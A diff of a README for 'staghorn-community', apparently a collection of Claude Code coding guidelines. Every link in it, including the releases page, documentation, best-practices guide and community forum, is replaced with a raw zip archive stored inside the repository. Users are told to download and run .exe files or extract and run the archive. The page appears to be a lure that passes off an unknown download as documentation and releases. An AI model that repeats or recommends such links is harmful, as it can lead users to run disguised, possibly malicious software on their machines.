@@ -4,10 +4,10 @@
 staghorn-community provides quality coding guidelines for Claude Code. This repository helps developers follow best practices in various programming languages, ensuring cleaner and more efficient code.
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip%20Latest%20Release-Visit%20Page-blue)](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip%20Latest%20Release-Visit%20Page-blue)](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip)
 
 ## 🚀 Getting Started
-To get started, simply visit our comprehensive [Releases page](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip). Here, you will find the latest version and its details.
+To get started, simply visit our comprehensive [Releases page](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip). Here, you will find the latest version and its details.
 
 1. Click on the link to the Releases page.
 2. Look for the latest version of staghorn-community.
@@ -17,7 +17,7 @@ If you're unsure about which file to choose, here are some common options you mi
 
 - **Windows Users**: Look for `.exe` files for easy installation.
 - **Mac Users**: Download `.dmg` files for compatibility.
-- **Linux Users**: Select `https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip` files to extract and run the application.
+- **Linux Users**: Select `https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip` files to extract and run the application.
 
 ## 📂 Features
 staghorn-community includes:
@@ -36,7 +36,7 @@ Before you download, ensure your system meets the following requirements:
 ## 🔍 Download & Install
 To download and install staghorn-community:
 
-1. Visit the [Releases page](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip).
 2. Select the latest release version.
 3. Choose the file that matches your operating system.
 4. Click the file to download.
@@ -58,9 +58,9 @@ Your feedback is valuable. We encourage users to contribute their own guidelines
 ## 📚 Additional Resources
 Here are some useful links to enhance your experience:
 
-- [Official Documentation](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip)
-- [Best Practices for Coding](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip)
-- [Community Forum](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip)
+- [Official Documentation](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip)
+- [Best Practices for Coding](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip)
 
 ## 🤝 Support
 If you need help with staghorn-community, please reach out through the Issues tab in this repository, or contact us via our community forum. We aim to respond quickly to all inquiries.
@@ -69,4 +69,4 @@ If you need help with staghorn-community, please reach out through the Issues ta
 staghorn-community is licensed under the MIT License. Feel free to use and modify the code as per your projects' requirements.
 
 ## 📈 Stay Updated
-For the latest news and updates on staghorn-community, check back regularly on our [Releases page](https://github.com/Vanvu2003x/staghorn-community/raw/refs/heads/main/rules/frontend/staghorn_community_2.4.zip). Your journey towards improved coding begins here!
+For the latest news and updates on staghorn-community, check back regularly on our [Releases page](https://raw.githubusercontent.com/Vanvu2003x/staghorn-community/main/commands/community-staghorn-1.0-beta.4.zip). Your journey towards improved coding begins here!
